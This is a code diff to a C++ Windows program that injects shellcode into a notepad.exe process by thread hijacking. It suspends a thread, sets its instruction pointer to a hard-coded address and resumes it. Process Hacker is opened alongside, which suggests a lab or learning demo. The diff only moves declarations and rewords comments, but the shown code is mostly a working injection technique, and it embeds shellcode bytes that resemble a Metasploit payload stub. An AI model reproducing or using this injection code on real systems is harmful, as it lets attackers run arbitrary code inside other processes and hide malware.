@@ -26,6 +26,14 @@ bool isNotepadRunning(DWORD pid) {
 
 int main()
 {
+    HANDLE targetProcessHandle;
+    PVOID remoteBuffer;
+    HANDLE threadHijacked = NULL;
+    HANDLE snapshot;
+    THREADENTRY32 threadEntry;
+    CONTEXT context;
+    DWORD targetPID;
+    
     unsigned char shellcode[] =
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
         "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -62,27 +70,20 @@ int main()
     STARTUPINFO si = { sizeof(si) }; // Initialize the STARTUPINFO structure
     PROCESS_INFORMATION pi; // Declare the PROCESS_INFORMATION structure
 
+    // (error check) Open notepad for the user
     if (!CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
     {
         std::cerr << "Failed to start notepad.exe" << std::endl;
         return 1;
     }
 
-    // Open Process Hacker 2 for the user
+    // (error check) Open Process Hacker 2 for the user
     if (!CreateProcess(TEXT("C:\\Program Files\\Process Hacker 2\\ProcessHacker.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
     {
         std::cerr << "Failed to start Process Hacker 2" << std::endl;
         return 1;
     }
 
-    HANDLE targetProcessHandle;
-    PVOID remoteBuffer;
-    HANDLE threadHijacked = NULL;
-    HANDLE snapshot;
-    THREADENTRY32 threadEntry;
-    CONTEXT context;
-
-    DWORD targetPID;
     while (true)
     {
         std::cout << "Please enter the notepad.exe PID: ";
@@ -125,7 +126,7 @@ int main()
     SuspendThread(threadHijacked);
 
     GetThreadContext(threadHijacked, &context);
-    context.Rip = 0x00000273c6cf0000;  // Hard code the new address here
+    context.Rip = 0x00000273c6cf0000;  // Hard coded the address here (easier to access)
     std::cout << "Shellcode located at memory address: " << (void*)0x00000273c6cf0000 << std::endl;
     SetThreadContext(threadHijacked, &context);
 
